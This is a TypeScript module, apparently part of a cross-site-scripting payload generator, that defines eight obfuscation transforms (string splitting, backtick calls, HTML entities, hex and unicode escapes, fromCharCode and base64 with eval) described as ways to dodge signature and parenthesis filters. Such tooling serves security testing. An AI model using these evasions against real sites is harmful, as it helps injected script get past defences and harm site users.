import { bytesToBase64 } from "../encoding/bytes";
import { utf8Bytes } from "../hash/bytes";
import { XssLevel, XssQuote, XssSlot } from "./injectionTypes";

export type ObfuscationId =
  | "none"
  | "string-concat"
  | "backtick-call"
  | "html-entity"
  | "unicode-escape"
  | "hex-escape"
  | "from-char-code"
  | "base64";

export type Obfuscation = {
  id: ObfuscationId;
  label: string;
  description: string;
  level: XssLevel;
  /** Slots this transform produces valid output for. HTML-entity decoding only happens while
   *  the HTML parser is reading an attribute value or text node — never inside <script> raw
   *  text or a javascript: URI — so it's restricted to "attribute". Everything else produces a
   *  plain JS expression that's valid wherever raw JS is expected. */
  slots: XssSlot[];
  /** Returns null when the transform doesn't apply to this actionExpr (e.g. string-concat and
   *  backtick-call only work on a `name(args)`-shaped call). Callers must fall back gracefully
   *  rather than emit broken output. */
  apply: (actionExpr: string, quote: XssQuote) => string | null;
};

const ALL_SLOTS: XssSlot[] = ["attribute", "script", "uri"];
const CALL_SHAPE = /^([A-Za-z_$][\w$.]*)\(([\s\S]*)\)$/;

function splitConcat(actionExpr: string, quote: XssQuote): string | null {
  const match = actionExpr.match(CALL_SHAPE);
  if (!match) return null;
  const [, name, args] = match;
  const mid = Math.max(1, Math.floor(name.length / 2));
  return `(${quote}${quote}+${quote}${name.slice(0, mid)}${quote}+${quote}${name.slice(mid)}${quote})(${args})`;
}

function backtickCall(actionExpr: string): string | null {
  const match = actionExpr.match(CALL_SHAPE);
  if (!match) return null;
  const [, name, args] = match;
  return `${name}\`${args}\``;
}

function htmlEntityEncodeAll(actionExpr: string): string {
  return Array.from(actionExpr, (ch) => `&#${ch.codePointAt(0)};`).join("");
}

function unicodeEscapeEval(actionExpr: string, quote: XssQuote): string {
  let escaped = "";
  for (const ch of actionExpr) escaped += "\\u" + ch.codePointAt(0)!.toString(16).padStart(4, "0");
  return `eval(${quote}${escaped}${quote})`;
}

function hexEscapeEval(actionExpr: string, quote: XssQuote): string | null {
  let escaped = "";
  for (const ch of actionExpr) {
    const code = ch.codePointAt(0)!;
    if (code > 0xff) return null; // \xHH can't represent codepoints above a byte
    escaped += "\\x" + code.toString(16).padStart(2, "0");
  }
  return `eval(${quote}${escaped}${quote})`;
}

function fromCharCodeEval(actionExpr: string): string {
  const codes = Array.from(actionExpr, (ch) => ch.codePointAt(0)).join(",");
  return `eval(String.fromCharCode(${codes}))`;
}

function base64Eval(actionExpr: string, quote: XssQuote): string {
  return `eval(atob(${quote}${bytesToBase64(utf8Bytes(actionExpr))}${quote}))`;
}

export const OBFUSCATIONS: Obfuscation[] = [
  {
    id: "none",
    label: "None",
    description: "The action expression is embedded as-is, with no additional encoding.",
    level: "basic",
    slots: ALL_SLOTS,
    apply: (a) => a,
  },
  {
    id: "string-concat",
    label: "String concatenation",
    description: "Splits the function name into concatenated string pieces (e.g. (''+'al'+'ert')(1)) to dodge plain signature matches. Only applies to a name(args)-shaped action.",
    level: "intermediate",
    slots: ALL_SLOTS,
    apply: splitConcat,
  },
  {
    id: "backtick-call",
    label: "Backtick call",
    description: "Calls the function using tagged-template syntax (e.g. alert`1`) instead of parentheses, dodging parenthesis-based filters. Only applies to a name(args)-shaped action.",
    level: "intermediate",
    slots: ALL_SLOTS,
    apply: (a) => backtickCall(a),
  },
  {
    id: "html-entity",
    label: "HTML-entity encode",
    description: "Encodes every character as an HTML entity (&#97;...). Only decodes correctly inside an HTML attribute value, not inside <script> or a javascript: URI.",
    level: "intermediate",
    slots: ["attribute"],
    apply: (a) => htmlEntityEncodeAll(a),
  },
  {
    id: "unicode-escape",
    label: "Unicode escape + eval",
    description: "Encodes the action as \\uXXXX escapes inside an eval(\"...\") call.",
    level: "advanced",
    slots: ALL_SLOTS,
    apply: unicodeEscapeEval,
  },
  {
    id: "hex-escape",
    label: "Hex escape + eval",
    description: "Encodes the action as \\xHH escapes inside an eval(\"...\") call. Only covers characters up to codepoint 0xFF.",
    level: "advanced",
    slots: ALL_SLOTS,
    apply: hexEscapeEval,
  },
  {
    id: "from-char-code",
    label: "String.fromCharCode",
    description: "Rebuilds the action from character codes via eval(String.fromCharCode(...)) — contains no quote characters at all.",
    level: "advanced",
    slots: ALL_SLOTS,
    apply: (a) => fromCharCodeEval(a),
  },
  {
    id: "base64",
    label: "Base64 (atob)",
    description: "Base64-encodes the action and decodes it at runtime via eval(atob('...')).",
    level: "advanced",
    slots: ALL_SLOTS,
    apply: base64Eval,
  },
];

export const OBFUSCATIONS_BY_ID: Record<ObfuscationId, Obfuscation> = Object.fromEntries(
  OBFUSCATIONS.map((o) => [o.id, o]),
) as Record<ObfuscationId, Obfuscation>;

export const NONE_OBFUSCATION = OBFUSCATIONS_BY_ID.none;
